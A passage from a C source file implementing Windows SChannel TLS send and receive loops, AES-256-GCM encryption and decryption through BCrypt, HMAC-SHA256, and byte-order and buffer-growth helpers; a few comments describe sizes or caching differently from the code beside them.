     * since those are always tiny.                                        */
    const BYTE *pCur  = pData;
    DWORD       cbRem = cbData;

    while (cbRem > 0) {
        DWORD cbChunk = (cbMaxMsg > 0 && cbRem > cbMaxMsg) ? cbMaxMsg : cbRem;

        /* Overflow guard before malloc */
        if (cbHdr > 0xFFFFFFFFu - cbChunk - cbTrailer) return FALSE;
        DWORD cbMsg = cbHdr + cbChunk + cbTrailer;

        BYTE *pMsg = (BYTE *)malloc(cbMsg);
        if (!pMsg) return FALSE;
        ZeroMemory(pMsg, cbMsg);
        memcpy(pMsg + cbHdr, pCur, cbChunk);

        SecBuffer     bufs[4] = {0};
        SecBufferDesc desc;
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer   = pMsg;             bufs[0].cbBuffer = cbHdr;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer   = pMsg + cbHdr;     bufs[1].cbBuffer = cbChunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer   = pMsg+cbHdr+cbChunk; bufs[2].cbBuffer = cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        desc.ulVersion = SECBUFFER_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        SECURITY_STATUS ss = EncryptMessage(&pCtx->hCtx, 0, &desc, 0);
        if (ss != SEC_E_OK) { free(pMsg); return FALSE; }

        DWORD cbSend = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        int   nSent  = send(pCtx->sock, (const char *)pMsg, (int)cbSend, 0);
        free(pMsg);
        if (nSent != (int)cbSend) return FALSE;

        pCur  += cbChunk;
        cbRem -= cbChunk;
    }
    return TRUE;
}


static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
{
    DWORD cbGot = 0;

    if (pCtx->cbPlainBuf >= cbWant) {
        memcpy(pDst, pCtx->pPlainBuf, cbWant);
        MoveMemory(pCtx->pPlainBuf, pCtx->pPlainBuf + cbWant, pCtx->cbPlainBuf - cbWant);
        pCtx->cbPlainBuf -= cbWant;
        return TRUE;
    }
    cbGot = pCtx->cbPlainBuf;
    memcpy(pDst, pCtx->pPlainBuf, cbGot);
    pCtx->cbPlainBuf = 0;

    /* Hard cap on the receive buffer to prevent unbounded growth when the
     * peer streams junk or a MITM floods incomplete TLS records.
     * 4 × TLS_MAX_RECORD_SIZE (≈ 64 KB) is generous for any real record. */
#ifndef TLS_RECV_BUF_MAX
#define TLS_RECV_BUF_MAX (256 * 1024)   /* 256 KB — well above any TLS record */
#endif
    while (cbGot < cbWant) {
        if (pCtx->cbRecvBuf < pCtx->streamSz.cbHeader) {
            DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
            if (cbSpace == 0) {
                if (pCtx->cbRecvBufAlloc >= TLS_RECV_BUF_MAX) {
                    pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE;
                }
                DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                if (cbNew > TLS_RECV_BUF_MAX) cbNew = TLS_RECV_BUF_MAX;
                BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew;
                cbSpace = cbNew - pCtx->cbRecvBuf;
            }
            int n = recv(pCtx->sock, (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf), (int)cbSpace, 0);
            if (n <= 0) {
                pCtx->lastErr = (WSAGetLastError() == WSAETIMEDOUT)
                    ? TLS_ERR_TIMEOUT : TLS_ERR_SOCKET;
                return FALSE;
            }
            pCtx->cbRecvBuf += (DWORD)n;
        }

        SecBuffer     bufs[4] = {0};
        SecBufferDesc desc;
        bufs[0].BufferType = SECBUFFER_DATA; bufs[0].pvBuffer = pCtx->pRecvBuf; bufs[0].cbBuffer = pCtx->cbRecvBuf;
        bufs[1].BufferType = SECBUFFER_EMPTY;
        bufs[2].BufferType = SECBUFFER_EMPTY;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        desc.ulVersion = SECBUFFER_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        SECURITY_STATUS ss = DecryptMessage(&pCtx->hCtx, &desc, 0, NULL);

        if (ss == SEC_E_INCOMPLETE_MESSAGE) {
            DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
            if (cbSpace == 0) {
                if (pCtx->cbRecvBufAlloc >= TLS_RECV_BUF_MAX) {
                    pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE;
                }
                DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                if (cbNew > TLS_RECV_BUF_MAX) cbNew = TLS_RECV_BUF_MAX;
                BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew; cbSpace = cbNew - pCtx->cbRecvBuf;
            }
            int n = recv(pCtx->sock, (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf), (int)cbSpace, 0);
            if (n <= 0) {
                pCtx->lastErr = (WSAGetLastError() == WSAETIMEDOUT)
                    ? TLS_ERR_TIMEOUT : TLS_ERR_SOCKET;
                return FALSE;
            }
            pCtx->cbRecvBuf += (DWORD)n;
            continue;
        }

        if (ss == SEC_I_RENEGOTIATE)    { pCtx->lastErr = TLS_ERR_PROTO;  return FALSE; }
        /* SEC_I_CONTEXT_EXPIRED = clean TLS close_notify from the peer.
         * This is not a crypto error — treat it as a clean socket close.  */
        if (ss == SEC_I_CONTEXT_EXPIRED){ pCtx->lastErr = TLS_ERR_SOCKET; return FALSE; }
        if (ss != SEC_E_OK)             { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }

        for (int i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                BYTE  *pDecr  = (BYTE *)bufs[i].pvBuffer;
                DWORD  cbDecr = bufs[i].cbBuffer;
                DWORD  needed = cbWant - cbGot;
                DWORD  direct = cbDecr < needed ? cbDecr : needed;

                memcpy(pDst + cbGot, pDecr, direct);
                cbGot += direct;

                if (cbDecr > direct) {
                    DWORD cbLeft = cbDecr - direct;
                    if (!_plain_buf_ensure(pCtx, pCtx->cbPlainBuf + cbLeft)) return FALSE;
                    memcpy(pCtx->pPlainBuf + pCtx->cbPlainBuf, pDecr + direct, cbLeft);
                    pCtx->cbPlainBuf += cbLeft;
                }
            }
        }

        /* SECBUFFER_EXTRA: SChannel left some bytes unconsumed at the tail of
         * pRecvBuf (they belong to the NEXT TLS record).  Move them to the
         * front so the next loop iteration feeds them back to DecryptMessage.
         * The offset is pCtx->cbRecvBuf - cbExtra because cbRecvBuf still
         * holds the total that was handed to DecryptMessage — SChannel does
         * not modify cbRecvBuf, only the buffer descriptor flags tell us how
         * much was processed.  This was always correct; adding explicit
         * comment to prevent future "simplification" that would break it.    */
        DWORD cbExtra = 0;
        for (int i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
                cbExtra = bufs[i].cbBuffer;
                MoveMemory(pCtx->pRecvBuf,
                           pCtx->pRecvBuf + pCtx->cbRecvBuf - cbExtra,
                           cbExtra);
                break;
            }
        }
        pCtx->cbRecvBuf = cbExtra;
    }

    return cbGot >= cbWant;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  AES-256-GCM encrypt / decrypt via BCrypt                                   */
/* ─────────────────────────────────────────────────────────────────────────── */

/*
 * _gcm_encrypt / _gcm_decrypt
 * ----------------------------
 * Use the cached key handles in pCtx instead of opening a new algorithm
 * provider on every call.  The BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO struct
 * is fully re-initialised each call so there is no stale state carry-over.
 *
 * Note: BCrypt GCM key handles are stateless between calls (the nonce and
 * tag are passed per-call in the auth mode info struct), so the same handle
 * can be reused safely for every message.
 */

static BOOL _gcm_encrypt(const BYTE *pKey, const BYTE *pPlain, DWORD cbPlain,
                          BYTE **ppOut, DWORD *pcbOut)
{
    /*
     * pKey is still accepted for the HMAC auth phase (called before the key
     * handles are cached).  If pCtx is not accessible from this static
     * function we fall back to creating a temporary handle.  In practice
     * tls_send_msg passes through tls_send_msg → _gcm_encrypt, but the
     * signature here is the internal BCrypt helper which does not carry
     * pCtx.  We keep pKey-based fallback for the two pre-cache calls
     * (none currently, but defensive).
     */
    *ppOut = NULL; *pcbOut = 0;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ok = FALSE;

    BYTE nonce[TLS_NONCE_LEN];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, nonce, TLS_NONCE_LEN,
            BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
        return FALSE;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR)), 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, 32, 0)))
        goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = nonce; ai.cbNonce = TLS_NONCE_LEN;
    ai.pbTag   = NULL;  ai.cbTag   = TLS_GCM_TAG_LEN;

    DWORD cbCt = 0;
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)pPlain, cbPlain,
            &ai, NULL, 0, NULL, 0, &cbCt, 0)))
        goto cleanup;

    DWORD cbTotal = TLS_NONCE_LEN + cbCt + TLS_GCM_TAG_LEN;
    BYTE *pOut = (BYTE *)malloc(cbTotal);
    if (!pOut) goto cleanup;

    BYTE tag[TLS_GCM_TAG_LEN];
    ai.pbTag = tag; ai.cbTag = TLS_GCM_TAG_LEN;
    DWORD cbWritten = 0;
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)pPlain, cbPlain, &ai, NULL, 0,
            pOut + TLS_NONCE_LEN, cbCt, &cbWritten, 0))) {
        free(pOut); goto cleanup;
    }
    memcpy(pOut, nonce, TLS_NONCE_LEN);
    memcpy(pOut + TLS_NONCE_LEN + cbCt, tag, TLS_GCM_TAG_LEN);
    *ppOut = pOut; *pcbOut = cbTotal;
    ok = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL _gcm_decrypt(const BYTE *pKey, const BYTE *pCipher, DWORD cbCipher,
                          BYTE **ppOut, DWORD *pcbOut)
{
    *ppOut = NULL; *pcbOut = 0;
    if (cbCipher < TLS_NONCE_LEN + TLS_GCM_TAG_LEN) return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ok = FALSE;

    const BYTE *pNonce = pCipher;
    DWORD       cbCt   = cbCipher - TLS_NONCE_LEN - TLS_GCM_TAG_LEN;
    const BYTE *pCt    = pCipher  + TLS_NONCE_LEN;
    const BYTE *pTag   = pCt      + cbCt;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR)), 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, 32, 0)))
        goto cleanup;

    BYTE *pOut = (BYTE *)malloc(cbCt + 1);
    if (!pOut) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)pNonce; ai.cbNonce = TLS_NONCE_LEN;
    ai.pbTag   = (PUCHAR)pTag;   ai.cbTag   = TLS_GCM_TAG_LEN;

    DWORD cbDec = 0;
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)pCt, cbCt, &ai,
            NULL, 0, pOut, cbCt, &cbDec, 0))) {
        free(pOut); goto cleanup;
    }
    *ppOut = pOut; *pcbOut = cbDec;
    ok = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/*
 * _gcm_encrypt_ctx / _gcm_decrypt_ctx
 * -------------------------------------
 * Fast path: use pre-cached BCrypt key handles from TLS_CONTEXT.
 * Called by tls_send_msg() and tls_recv_msg() for every data message
 * after the connection is established.
 */
static BOOL _gcm_encrypt_ctx(PTLS_CONTEXT pCtx, const BYTE *pPlain, DWORD cbPlain,
                              BYTE **ppOut, DWORD *pcbOut)
{
    *ppOut = NULL; *pcbOut = 0;
    if (!pCtx->hAesKeyEnc) return FALSE;

    BYTE nonce[TLS_NONCE_LEN];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, nonce, TLS_NONCE_LEN,
            BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
        return FALSE;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = nonce; ai.cbNonce = TLS_NONCE_LEN;
    ai.pbTag   = NULL;  ai.cbTag   = TLS_GCM_TAG_LEN;

    DWORD cbCt = 0;
    if (!BCRYPT_SUCCESS(BCryptEncrypt(pCtx->hAesKeyEnc, (PUCHAR)pPlain, cbPlain,
            &ai, NULL, 0, NULL, 0, &cbCt, 0)))
        return FALSE;

    DWORD cbTotal = TLS_NONCE_LEN + cbCt + TLS_GCM_TAG_LEN;
    BYTE *pOut = (BYTE *)malloc(cbTotal);
    if (!pOut) return FALSE;

    BYTE tag[TLS_GCM_TAG_LEN];
    ai.pbTag = tag; ai.cbTag = TLS_GCM_TAG_LEN;
    DWORD cbWritten = 0;
    if (!BCRYPT_SUCCESS(BCryptEncrypt(pCtx->hAesKeyEnc, (PUCHAR)pPlain, cbPlain, &ai,
            NULL, 0, pOut + TLS_NONCE_LEN, cbCt, &cbWritten, 0))) {
        free(pOut); return FALSE;
    }
    memcpy(pOut, nonce, TLS_NONCE_LEN);
    memcpy(pOut + TLS_NONCE_LEN + cbCt, tag, TLS_GCM_TAG_LEN);
    *ppOut = pOut; *pcbOut = cbTotal;
    return TRUE;
}

static BOOL _gcm_decrypt_ctx(PTLS_CONTEXT pCtx, const BYTE *pCipher, DWORD cbCipher,
                              BYTE **ppOut, DWORD *pcbOut)
{
    *ppOut = NULL; *pcbOut = 0;
    if (!pCtx->hAesKeyDec) return FALSE;
    if (cbCipher < TLS_NONCE_LEN + TLS_GCM_TAG_LEN) return FALSE;

    const BYTE *pNonce = pCipher;
    DWORD       cbCt   = cbCipher - TLS_NONCE_LEN - TLS_GCM_TAG_LEN;
    const BYTE *pCt    = pCipher  + TLS_NONCE_LEN;
    const BYTE *pTag   = pCt      + cbCt;

    BYTE *pOut = (BYTE *)malloc(cbCt + 1);
    if (!pOut) return FALSE;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)pNonce; ai.cbNonce = TLS_NONCE_LEN;
    ai.pbTag   = (PUCHAR)pTag;   ai.cbTag   = TLS_GCM_TAG_LEN;

    DWORD cbDec = 0;
    if (!BCRYPT_SUCCESS(BCryptDecrypt(pCtx->hAesKeyDec, (PUCHAR)pCt, cbCt, &ai,
            NULL, 0, pOut, cbCt, &cbDec, 0))) {
        free(pOut); return FALSE;
    }
    *ppOut = pOut; *pcbOut = cbDec;
    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  HMAC-SHA256 via BCrypt                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _hmac_sha256(const BYTE *pKey, DWORD cbKey,
                          const BYTE *pMsg, DWORD cbMsg,
                          BYTE *pOut)
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BOOL ok = FALSE;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
            BCRYPT_ALG_HANDLE_HMAC_FLAG)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)pKey, cbKey, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptHashData(hHash, (PUCHAR)pMsg, cbMsg, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hHash, pOut, TLS_AUTH_HMAC_LEN, 0)))
        goto cleanup;
    ok = TRUE;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Byte-order helpers                                                         */
/* ─────────────────────────────────────────────────────────────────────────── */

static void _write_be32(BYTE *p, uint32_t v) {
    p[0]=(BYTE)(v>>24); p[1]=(BYTE)(v>>16); p[2]=(BYTE)(v>>8); p[3]=(BYTE)v;
}
static void _write_be64(BYTE *p, uint64_t v) {
    p[0]=(BYTE)(v>>56); p[1]=(BYTE)(v>>48); p[2]=(BYTE)(v>>40); p[3]=(BYTE)(v>>32);
    p[4]=(BYTE)(v>>24); p[5]=(BYTE)(v>>16); p[6]=(BYTE)(v>>8);  p[7]=(BYTE)v;
}
static uint32_t _read_be32(const BYTE *p) {
    return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|((uint32_t)p[2]<<8)|(uint32_t)p[3];
}
static uint64_t _read_be64(const BYTE *p) {
    return ((uint64_t)p[0]<<56)|((uint64_t)p[1]<<48)|((uint64_t)p[2]<<40)|((uint64_t)p[3]<<32)
          |((uint64_t)p[4]<<24)|((uint64_t)p[5]<<16)|((uint64_t)p[6]<<8) |(uint64_t)p[7];
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Plaintext staging buffer growth helper                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _plain_buf_ensure(PTLS_CONTEXT pCtx, DWORD cbNeed)
{
    if (pCtx->cbPlainBufAlloc >= cbNeed) return TRUE;
    DWORD cbNew = pCtx->cbPlainBufAlloc * 2;
    if (cbNew < cbNeed) cbNew = cbNeed;
    BYTE *p = (BYTE *)realloc(pCtx->pPlainBuf, cbNew);
    if (!p) return FALSE;
    pCtx->pPlainBuf = p; pCtx->cbPlainBufAlloc = cbNew;
    return TRUE;
}
